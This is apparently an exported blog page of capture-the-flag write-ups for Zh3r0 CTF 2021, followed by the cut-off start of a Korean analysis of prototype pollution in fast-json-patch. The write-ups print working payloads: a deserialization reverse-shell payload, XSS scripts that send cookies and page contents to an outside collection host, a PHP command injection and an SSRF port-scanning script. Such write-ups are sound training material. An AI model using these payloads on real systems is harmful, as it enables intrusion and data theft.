class="string">&#x27;guest.ejs&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/guest&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (req.cookies.guest) &#123;</span><br><span class="line">   <span class="keyword">var</span> str = <span class="keyword">new</span> Buffer(req.cookies.guest, <span class="string">&#x27;base64&#x27;</span>).toString();</span><br><span class="line">   <span class="keyword">var</span> obj = serialize.unserialize(str);</span><br><span class="line">   <span class="keyword">if</span> (obj.username) &#123;</span><br><span class="line">     res.send(<span class="string">&quot;Hello &quot;</span> + <span class="built_in">escape</span>(obj.username) + <span class="string">&quot;. This page is currently under maintenance for Guest users. Please go back to the login page&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">var</span> username = req.body.username </span><br><span class="line"> <span class="keyword">var</span> country = req.body.country </span><br><span class="line"> <span class="keyword">var</span> city = req.body.city</span><br><span class="line"> <span class="keyword">var</span> serialized_info = <span class="string">`&#123;&quot;username&quot;:&quot;<span class="subst">$&#123;username&#125;</span>&quot;,&quot;country&quot;:&quot;<span class="subst">$&#123;country&#125;</span>&quot;,&quot;city&quot;:&quot;<span class="subst">$&#123;city&#125;</span>&quot;&#125;`</span></span><br><span class="line">     <span class="keyword">var</span> encoded_data = <span class="keyword">new</span> Buffer(serialized_info).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"> res.cookie(<span class="string">&#x27;guest&#x27;</span>, encoded_data, &#123;</span><br><span class="line">       maxAge: <span class="number">900000</span>,</span><br><span class="line">       httpOnly: <span class="literal">true</span></span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"> res.send(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(process.env.PORT || <span class="number">7777</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Listening on port 7777...&quot;</span>);</span><br></pre></td></tr></table></figure><p>Look at the above code, You can see using the <code>unserialize()</code> method. <code>unserialize()</code> method is very vulnerable to <code>deserialization RCE</code>. But Server is very vulnerable because <code>not filtering</code> the argument(req.cookies.guest).</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/poc.png?raw=true"></p><p>Look at the above photo, You can see occurring the RCE.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw1Miw0OSw0Niw0OSw1NCw1Miw0Niw1Myw1MCw0Niw1MCw0OCw1NSwzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1Niw0OCwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>So, I get the reverse shell using the above poc code and read /flag.txt</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/flag.png?raw=true"></p><blockquote><p>FLAG : zh3r0{4ll_y0u_h4d_t0_d0_w4s_m0v3_th3_0bjc3ts_3mper0r}</p></blockquote><hr><h2 id="Web-bxss-100-pts"><a href="#Web-bxss-100-pts" class="headerlink" title="(Web) bxss [100 pts]"></a>(Web) bxss [100 pts]</h2><blockquote><p>The bxss challenge is steal flag in /flag using the Reflected XSS.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/check%20flag.png?raw=true"></p><p>First, When I send a request with /flag, able see the flag by only admin.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/feedback.png?raw=true"></p><p>When I look at the feedback page, I able enter the feedback content. I’m just wondering and enter the <code>&lt;script&gt;location.href = &quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;&lt;/script&gt;</code> and requested.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%201.png?raw=true"></p><p>I checked the requestbin and I saw that the receive the request in requestbin.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    fetch(<span class="string">&quot;/flag&quot;</span>).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?a=&quot;</span> + x));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>I immediately sent the above payload and read /flag</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%202.png?raw=true"></p><blockquote><p>FLAG : <code>zh3r0&#123;&#123;Ea5y_bx55_ri8&#125;&#125;</code></p></blockquote><hr><h2 id="Web-strpos-and-substr-395-pts"><a href="#Web-strpos-and-substr-395-pts" class="headerlink" title="(Web) strpos and substr [395 pts]"></a>(Web) strpos and substr [395 pts]</h2><blockquote><p>The strpos and substr challenge is get flag using the simple RCE. But a lot of filtering.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;hello&#x27;;`ls`&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;hello&#x27;,`ls`&quot;</span>);</span><br></pre></td></tr></table></figure><p>Above two payloads are same. So, I bypassed the <code>;</code> to <code>,</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,system  (&#39;head &#x2F;*&#39; ),&#39;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/strpos%20and%20substr/1.png?raw=true"></p><blockquote><p>FLAG : zh3r0{W4RmUp_4_Fun_13333333337}</p></blockquote><hr><h2 id="Web-Original-Store-842-pts"><a href="#Web-Original-Store-842-pts" class="headerlink" title="(Web) Original Store [842 pts]"></a>(Web) Original Store [842 pts]</h2><blockquote><p>The Original Store challenge is steal admin cookie using the Reflected XSS. I solved using the unintended exploit</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/1.png?raw=true"></p><p>First, I sign up and login</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/2.png?raw=true"></p><p>After logging in, looking at the functions, there were not many. So When I go to /account.php, here checked the user information. When I went to /account.php, I thought I should check the user information after login as admin. So, I decided to steal the admin cookie using the xss and use it to check the /account.php.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/4.png?raw=true"></p><p>When I checked requestbin after sent a <code>https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net</code> on the <code>http://35.200.166.215:5556/</code>, I was able to confirm that the request was received.</p><p>So, I uploaded the xss poc to the private server and tried to attack, but it didn’t work…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = URL;</span><br></pre></td></tr></table></figure><p>Hm.. I thought that the server would handle it as above. So I just tried xss using <code>javascript:</code> scheme.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:(<span class="function">()=&gt;</span>&#123;<span class="built_in">window</span>.location=<span class="string">`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net?<span class="subst">$&#123;<span class="built_in">document</span>.cookie&#125;</span>`</span>&#125;)()</span><br></pre></td></tr></table></figure><p>So I just tried xss using as above <code>javascript:</code> scheme.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/5.png?raw=true"></p><p>When I checked requestbin, Well was steal admin cookie. So I send a request to /account.php using the admin cookie.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/6.png?raw=true"></p><p>Nice I got the flag.</p><blockquote><p>FLAG : zh3r0{4dm1n_l0ves_0nly_0r1g1n4ls_br0}</p></blockquote><hr><h2 id="Web-Original-Store-v2-871-pts"><a href="#Web-Original-Store-v2-871-pts" class="headerlink" title="(Web) Original Store v2 [871 pts]"></a>(Web) Original Store v2 [871 pts]</h2><blockquote><p>The Original Store v2 challenge is steal document, not admin cookie on the user page /account.php using the Reflected XSS because set the httponly option on the cookie. I solved using the unintended exploit</p></blockquote><p>Original Store v2 is the same as Original Store. The difference is can not steal the admin cookie. Maybe Was set the <code>httponly</code> options..</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:(<span class="function">()=&gt;</span>&#123;fetch(<span class="string">&#x27;/account.php&#x27;</span>).then(<span class="function">(<span class="params">x</span>)=&gt;</span>x.text()).then(<span class="function">(<span class="params">x</span>)=&gt;</span>fetch(<span class="string">`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net?<span class="subst">$&#123;x&#125;</span>`</span>))&#125;)()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store%20V2/1.png?raw=true"></p><blockquote><p>FLAG : zh3r0{4dm1n_h4tes_car_st34l3rs_br0}</p></blockquote><hr><h2 id="Web-Baby-SSRF-453-pts"><a href="#Web-Baby-SSRF-453-pts" class="headerlink" title="(Web) Baby SSRF [453 pts]"></a>(Web) Baby SSRF [453 pts]</h2><blockquote><p>The Baby SSRF challenge is find a port using the brute forcing and enter the internal server ip:port</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in range(5000,10000)</span><br><span class="line"></span><br><span class="line">xD</span><br></pre></td></tr></table></figure><p>The organizer provided the above hint. The hint is mean to make the port random for range 5000 to 10000. So first I should find the port using the brute forcing and send a url using the ssrf  vulnerability.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/waf.png?raw=true"></p><p>If you enter the localhost/127.0.0.1, You can check the filtering. But I can bypass 127.0.0.1 to 0x7f000001.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.zh3r0.cf:6969/request&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span>(<span class="params">s, e</span>):</span></span><br><span class="line">    <span class="keyword">global</span> localhost</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s,e):</span><br><span class="line">        data = &#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;http://0x7f000001:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)&#125;</span><br><span class="line">        res = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Learn about URL&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res <span class="keyword">and</span> <span class="string">&quot;Please dont try to heck me sir...&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag = res.split(<span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;zh3r0&#123;&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">                    log.info(<span class="string">&quot;The internal Server is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">                    log.info(<span class="string">&quot;The flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    log.info(<span class="string">&quot;Exploit&quot;</span>)</span><br><span class="line">    th1 = Thread(target=a, args=(<span class="number">8001</span>, <span class="number">9000</span>))</span><br><span class="line">    th2 = Thread(target=a, args=(<span class="number">9001</span>, <span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">    th1.start()</span><br><span class="line">    th2.start()</span><br></pre></td></tr></table></figure><p>I wrote the above poc code.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/1.png?raw=true"></p><p>I execute the poc code and I can see the flag.</p><blockquote><p>FLAG : zh3r0{SSRF_0r_wh4t3v3r_ch4ll3ng3}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SSRF </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Prototype Pollution in fast-json-patch module</title>
      <link href="2021/05/31/2021-05-31-Prototype-Pollution-in-JsonPatch/"/>
      <url>2021/05/31/2021-05-31-Prototype-Pollution-in-JsonPatch/</url>
      
        <content type="html"><![CDATA[<h2 id="TR-DL"><a href="#TR-DL" class="headerlink" title="TR;DL"></a>TR;DL</h2><blockquote><p>Prototype Pollution</p></blockquote><hr><h2 id="Analysis-Introduce"><a href="#Analysis-Introduce" class="headerlink" title="Analysis : Introduce"></a>Analysis : Introduce</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/prototype/prototype1.png?raw=true"></p><p>위 사진을 보면 <code>fast-json-patch</code> 모듈의 <code>applyPatch()</code> 메서드를 이용해서 a라는 메서드를 패치 시켜주는데, 이때 내부 오퍼레이션에 의해서 <code>Prototype Pollution</code> 취약점이 발생한다. 인자로는 2개의 값을 보내주는 것을 볼 수 있다. 첫 번째 인자는 패치할 주체가 들어가고, 두 번째 인자로는 패치의 적용할 데이터를 <code>Json</code> 형식으로 보내는 것을 볼 수 있고, 이 두 번째 인자에서 두 번째 값인 <code>path</code> 키의 대해서 <code>Prototype Pollution</code> 취약점이 발생한다.</p><hr><h2 id="Analysis-applyPatch"><a href="#Analysis-applyPatch" class="headerlink" title="Analysis : applyPatch()"></a>Analysis : applyPatch()</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">applyPatch</span>(<span class="params"><span class="built_in">document</span>, patch, validateOperation, mutateDocument, banPrototypeModifications</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mutateDocument === <span class="keyword">void</span> <span class="number">0</span>) &#123; mutateDocument = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (banPrototypeModifications === <span class="keyword">void</span> <span class="number">0</span>) &#123; banPrototypeModifications = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (validateOperation) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(patch)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">exports</span>.JsonPatchError(<span class="string">&#x27;Patch sequence must be an array&#x27;</span>, <span class="string">&#x27;SEQUENCE_NOT_AN_ARRAY&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!mutateDocument) &#123;</span><br><span class="line">        <span class="built_in">document</span> = helpers_js_1._deepClone(<span class="built_in">document</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> results = <span class="keyword">new</span> <span class="built_in">Array</span>(patch.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, length_1 = patch.length; i &lt; length_1; i++) &#123;</span><br><span class="line">        <span class="comment">// we don&#x27;t need to pass mutateDocument argument because if it was true, we already deep cloned the object, we&#x27;ll just pass `true`</span></span><br><span class="line">        results[i] = applyOperation(<span class="built_in">document</span>, patch[i], validateOperation, <span class="literal">true</span>, banPrototypeModifications, i);</span><br><span class="line">        <span class="built_in">document</span> = results[i].newDocument; <span class="comment">// in case root was replaced</span></span><br><span class="line">    &#125;</span><br><span class="line">    results.newDocument = <span class="built_in">document</span>;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>applyPatch()</code> 메서드는 <code>core.js</code> 파일에 정의가 되어 있다. 코드를 보면 중간 부분에 <code>patch</code> 배열을 <code>for</code> 문으로 돌려가며 하나씩 <code>applyOperation()</code> 메서드의 두 번째 인자로 넘겨주는 것을 볼 수 있고, 첫 번째 인자는 당연 우리가 보내준 패치 될 주체이다. 여기서 <code>patch</code>는 우리가 위에서 <code>applyPatch()</code> 함수에 넘겨준 두 번째 인자값이 된다.</p><p><code>applyOperation()</code> 메서드를 호출하는 것을 보면 우리가 보낸 패치 파일을 다중으로 적용하는 것이 아닌 단일로 하나씩 적용하는 것으로 보인다.</p><hr><h2 id="Analsys-applyOperation"><a href="#Analsys-applyOperation" class="headerlink" title="Analsys : applyOperation()"></a>Analsys : applyOperation()</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">applyOperation</span>(<span class="params"><span class="built_in">document</span>, operation, validateOperation, mutateDocument, banPrototypeModifications, index</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (validateOperation === <span class="keyword">void</span> <span class="number">0</span>) &#123; validateOperation = <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (mutateDocument === <span class="keyword">void</span> <span class="number">0</span>) &#123; mutateDocument = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (banPrototypeModifications === <span class="keyword">void</span> <span class="number">0</span>) &#123; banPrototypeModifications = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (index === <span class="keyword">void</span> <span class="number">0</span>) &#123; index = <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (validateOperation) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> validateOperation == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">            validateOperation(operation, <span class="number">0</span>, <span class="built_in">document</span>, operation.path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            validator(operation, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ROOT OPERATIONS */</span></span><br><span class="line">    <span class="keyword">if</span> (operation.path === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> returnValue = &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span> &#125;;</span><br><span class="line">        <span class="keyword">if</span> (operation.op === <span class="string">&#x27;add&#x27;</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!mutateDocument) &#123;</span><br><span class="line">            <span class="built_in">document</span> = helpers_js_1._deepClone(<span class="built_in">document</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> path = operation.path || <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> keys = path.split(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> obj = <span class="built_in">document</span>;</span><br><span class="line">        <span 